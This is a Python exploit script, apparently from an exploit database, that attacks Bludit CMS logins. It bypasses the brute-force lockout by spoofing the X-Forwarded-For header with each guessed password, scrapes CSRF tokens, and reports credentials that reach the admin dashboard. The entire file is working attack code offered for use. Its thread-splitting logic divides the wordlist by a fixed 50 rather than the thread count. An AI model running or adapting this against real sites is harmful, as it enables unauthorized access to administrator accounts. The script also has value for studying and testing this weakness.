#!/usr/bin/env python3
# Exploit Title: Bludit Brute Force Mitigation Bypass 
# Date: 2020-09-12
# Exploit Author: Andres Calderon (Candres1019)
# Based on: https://rastating.github.io/bludit-brute-force-mitigation-bypass/
# Vendor Homepage: http://www.bludit.com/
# Example: python BruteForceAttack.py -i http://10.10.10.111 -t 50 -u user -w ~/Desktop/SPTI/Carpet/passwords.txt

import re
import requests
import threading
import sys
import argparse
import time

def bruteForce(wordlist):

	for password in wordlist:
		session = requests.Session()
		login_page = session.get(login_url)
		csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
		
		headers = {
		    'X-Forwarded-For': password,
		    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
		    'Referer': login_url
		}

		data = {
		    'tokenCSRF': csrf_token,
		    'username': username,
		    'password': password,
		    'save': ''
		}

		login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

		if 'location' in login_result.headers:
		    if '/admin/dashboard' in login_result.headers['location']:
		        print('*********************************************************')
		        print('* SUCCESS: Password found!                              *')
		        print('* Use {u}:{p} to login.'.format(u = username, p = password))
		        print('*********************************************************')
		        break



if __name__ == "__main__":
	parser = argparse.ArgumentParser(prog='BruteForceAttack.py',
		description='Bludit Brute Force Mitigation Bypass',
		formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=80))

	#Threads
	parser.add_argument('-t', '--thread', metavar='Threads', type=int,
    required=True, dest='numHilos', help='Number of threads to run the script')

	#Host
	parser.add_argument('-i', '--host', metavar='Hosts', type=str,
    required=True, dest='host', help='The Target host URL')
	
	#User
	parser.add_argument('-u', '--username', metavar='UserName', type=str,
    required=True, dest='username', help='The username to use')

	#Wordlist
	parser.add_argument('-w', '--wordlist', metavar='WordList', type=str,
    required=True, dest='archivo', help='The passwords wordlist')

	args = parser.parse_args()
	
	host = args.host
	login_url = host + '/admin/login'
	username = args.username
	word = ''
	archivo = open(args.archivo, "r")
	wordlist = []
	for i in archivo.readlines():
		word = i.replace("\n", "")
		if word in wordlist:
			continue
		else:
			wordlist.append(i.replace("\n", ""))

	wordListLon = len(wordlist)
	numHilos = args.numHilos
	divList = wordListLon//50

	for i in range(numHilos):
		hilo = threading.Thread(name='hilo%s' %i, target=bruteForce,args=(wordlist[i*divList:(i+1)*divList],));
		hilo.start()
